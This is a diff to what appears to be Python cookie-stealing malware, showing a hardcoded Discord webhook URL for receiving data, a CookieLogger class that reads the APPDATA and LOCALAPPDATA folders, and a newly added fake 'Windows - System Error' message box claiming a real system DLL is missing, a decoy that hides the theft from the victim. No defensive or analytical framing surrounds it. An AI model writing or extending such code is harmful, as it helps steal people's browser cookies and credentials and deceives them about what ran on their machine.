@@ -2,6 +2,7 @@ webhook = "https://discord.com/api/webhooks/1097208095786143774/W1GYzRAiTUcOS-4T
 
 import os
 import json
+import ctypes
 import random
 import string
 import base64
@@ -21,14 +22,15 @@ def safe(func):
             pass
     return wrapper
 
-def generate_dll_name() -> str:
-    dll_name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
-    dll_name += ".dll"
-        
-    return dll_name
+def dll_name() -> str:
+    dll_list = ['kernel32.dll', 'user32.dll', 'advapi32.dll', 'msvcrt.dll', 'gdi32.dll', 'comdlg32.dll', 'shell32.dll', 'ole32.dll', 'oleaut32.dll', 'wininet.dll', 'winspool.drv', 'urlmon.dll', 'uuid.dll', 'mpr.dll', 'netapi32.dll', 'version.dll', 'crypt32.dll', 'ws2_32.dll', 'msvcp140.dll', 'vcruntime140.dll', 'shlwapi.dll', 'secur32.dll', 'dbghelp.dll', 'imm32.dll', 'usp10.dll', 'kernelbase.dll', 'userenv.dll', 'cfgmgr32.dll', 'devobj.dll', 'setupapi.dll']
+    
+    return random.choice(dll_list)
+
+def message_box() -> bool:
+    ctypes.windll.user32.MessageBoxW(None, f"This application failed to start because {dll_name()} was not found. Re-installing the application may fix this problem.", "Windows - System Error", 0)
 
 class CookieLogger:
-
     appdata = os.getenv('APPDATA')
     localappdata = os.getenv('LOCALAPPDATA')
 
